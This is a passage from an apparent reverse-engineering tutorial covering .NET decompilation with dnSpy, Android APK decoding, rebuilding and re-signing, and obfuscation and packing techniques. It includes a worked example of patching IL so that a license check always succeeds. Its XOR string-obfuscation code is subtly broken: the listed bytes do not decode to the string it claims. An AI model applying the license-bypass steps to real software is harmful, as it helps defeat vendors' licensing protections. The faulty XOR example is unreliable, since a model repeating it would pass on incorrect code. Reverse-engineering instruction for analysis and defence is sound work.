<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>dnSpy</strong></td><td>.NET decompiler &amp; debugger (best all-in-one tool)</td></tr><tr><td><strong>ILSpy</strong></td><td>.NET decompiler (open-source)</td></tr><tr><td><strong>dotPeek</strong></td><td>.NET decompiler (JetBrains, free)</td></tr><tr><td><strong>de4dot</strong></td><td>.NET deobfuscator</td></tr></tbody></table>
<p><strong>dnSpy usage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Windows: Launch dnSpy.exe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dnSpy.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Open .NET assembly:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># File → Open → Select .exe or .dll</span><br></span></code></pre></div></div>
<p><strong>dnSpy features:</strong></p>
<p><strong>1. Decompiled C# code:</strong></p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// Original source (approximately):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class LicenseChecker {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static bool CheckLicense(string key) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        string validKey = &quot;ABC123-XYZ789&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (key == validKey) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><strong>2. IL (Intermediate Language) view:</strong></p>
<div class="language-il codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-il codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.method public static bool CheckLicense(string key) cil managed {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .maxstack 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    .locals init ([0] bool result)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ldstr &quot;ABC123-XYZ789&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ldarg.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call bool [mscorlib]System.String::op_Equality(string, string)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stloc.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ldloc.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><strong>3. Editing &amp; patching:</strong></p>
<ul>
<li class="">Right-click on method → <strong>Edit IL Instructions</strong></li>
<li class="">Modify IL code (e.g., change comparison to always return true)</li>
<li class=""><strong>File → Save Module</strong> (save patched binary)</li>
</ul>
<p><strong>Example: Bypass license check:</strong></p>
<p><strong>Before:</strong></p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if (key == validKey) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return false;</span><br></span></code></pre></div></div>
<p><strong>Patch IL:</strong></p>
<div class="language-il codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-il codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Change conditional to always return true:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Replace &quot;call bool System.String::op_Equality&quot; with:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop       ; Discard comparison result</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop       ; Discard arguments</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ldc.i4.1  ; Push TRUE (1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre></div></div>
<p><strong>de4dot (deobfuscation):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Remove obfuscation from .NET binary:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">de4dot.exe obfuscated.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: obfuscated-cleaned.exe (deobfuscated)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="android-apk-reversing">Android APK Reversing<a href="#android-apk-reversing" class="hash-link" aria-label="Direct link to Android APK Reversing" title="Direct link to Android APK Reversing" translate="no">​</a></h3>
<p><strong>APK (Android Package)</strong> is a ZIP file containing:</p>
<ul>
<li class=""><strong>classes.dex:</strong> Dalvik bytecode (compiled Java/Kotlin)</li>
<li class=""><strong>lib/:</strong> Native libraries (.so files for ARM/x86)</li>
<li class=""><strong>res/:</strong> Resources (images, layouts)</li>
<li class=""><strong>AndroidManifest.xml:</strong> App permissions and components</li>
</ul>
<p><strong>Tools:</strong></p>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>JADX</strong></td><td>DEX to Java decompiler (GUI &amp; CLI)</td></tr><tr><td><strong>Apktool</strong></td><td>Decode APK to smali (Dalvik assembly)</td></tr><tr><td><strong>dex2jar</strong></td><td>Convert DEX to JAR (for JD-GUI)</td></tr><tr><td><strong>Frida</strong></td><td>Dynamic instrumentation for Android</td></tr><tr><td><strong>Ghidra</strong></td><td>Reverse native libraries (.so files)</td></tr></tbody></table>
<p><strong>JADX usage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install JADX:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://github.com/skylot/jadx/releases</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Decompile APK:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jadx app.apk </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> output_dir</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use GUI:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jadx-gui app.apk</span><br></span></code></pre></div></div>
<p><strong>JADX output:</strong></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// Decompiled Java code (from classes.dex):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class MainActivity extends AppCompatActivity {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private void checkLicense() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String license = &quot;VALID-LICENSE-KEY&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String userInput = editText.getText().toString();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (userInput.equals(license)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Toast.makeText(this, &quot;Access granted!&quot;, Toast.LENGTH_SHORT).show();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Toast.makeText(this, &quot;Invalid license&quot;, Toast.LENGTH_SHORT).show();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><strong>Apktool usage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Decode APK to smali (Dalvik assembly):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apktool d app.apk </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> app_decoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output directory structure:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># app_decoded/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#   smali/          (Dalvik assembly code)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#   res/            (resources)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#   AndroidManifest.xml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Edit smali code, then rebuild:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apktool b app_decoded </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> app_modified.apk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Sign APK:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jarsigner </span><span class="token parameter variable" style="color:#36acaa">-verbose</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-sigalg</span><span class="token plain"> SHA1withRSA </span><span class="token parameter variable" style="color:#36acaa">-digestalg</span><span class="token plain"> SHA1 </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token parameter variable" style="color:#36acaa">-keystore</span><span class="token plain"> my.keystore app_modified.apk alias_name</span><br></span></code></pre></div></div>
<p><strong>Analyzing native libraries (.so files):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># APK may contain native ARM/x86 libraries in lib/:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># lib/armeabi-v7a/libnative.so</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># lib/arm64-v8a/libnative.so</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># lib/x86/libnative.so</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract .so file from APK:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">unzip</span><span class="token plain"> app.apk lib/arm64-v8a/libnative.so</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Analyze in Ghidra:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># File → Import File → libnative.so</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Analyze with default settings</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="anti-reversing-techniques">Anti-Reversing Techniques<a href="#anti-reversing-techniques" class="hash-link" aria-label="Direct link to Anti-Reversing Techniques" title="Direct link to Anti-Reversing Techniques" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="obfuscation">Obfuscation<a href="#obfuscation" class="hash-link" aria-label="Direct link to Obfuscation" title="Direct link to Obfuscation" translate="no">​</a></h3>
<p><strong>Obfuscation</strong> makes code harder to understand without changing functionality.</p>
<p><strong>Control flow obfuscation:</strong></p>
<p><strong>Before (simple if statement):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;correct&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">access_granted</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">access_denied</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>After (obfuscated with opaque predicates):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">?</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Always 1, but hard to analyze statically</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;correct&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">access_granted</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">access_denied</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>String obfuscation (XOR encoding):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Hardcoded string is visible in binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;secret123&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Obfuscated (XOR with key):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> enc</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x02</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x15</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x02</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x56</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x50</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    password</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> enc</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x42</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// XOR with 0x42</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">password</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token char">&#x27;\0&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Result: &quot;secret123&quot;</span><br></span></code></pre></div></div>
<p><strong>Defeating string obfuscation:</strong></p>
<ol>
<li class="">Find decoding loop in disassembly</li>
<li class="">Extract encoded data and XOR key</li>
<li class="">Decode manually or with script</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="packing">Packing<a href="#packing" class="hash-link" aria-label="Direct link to Packing" title="Direct link to Packing" translate="no">​</a></h3>
<p><strong>Packing</strong> compresses or encrypts the entire binary, unpacking at runtime.</p>
<p><strong>Common packers:</strong></p>
<ul>
<li class=""><strong>UPX:</strong> Universal Packer for eXecutables (open-source, easy to unpack)</li>
<li class=""><strong>Themida:</strong> Commercial packer with anti-debugging and virtualization</li>
<li class=""><strong>VMProtect:</strong> Virtualizes code (converts to custom VM instructions)</li>
<li class=""><strong>Enigma Protector:</strong> Packer with anti-debugging and virtualization</li>
</ul>
<p><strong>Detecting packed binaries:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># High entropy (compressed/encrypted data):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use &quot;Detect It Easy&quot; (DiE): https://github.com/horsicq/Detect-It-Easy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or check entropy manually:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ent malware.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Entropy &gt; 7.0 suggests packing/encryption</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Check for known packer signatures:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># IDA Pro: &quot;UPX0&quot;, &quot;UPX1&quot; sections</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># PE sections with unusual names (.vmp, .themida, etc.)</span><br></span></code></pre></div></div>
<p><strong>Unpacking UPX:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># UPX can be unpacked with official unpacker:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upx </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> packed.exe </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> unpacked.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Manual unpacking (if UPX modified):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Find OEP (Original Entry Point) via debugger</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Set breakpoint on &quot;pushad&quot; instruction (typical UPX stub)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Run until unpacking complete</span><span class="token 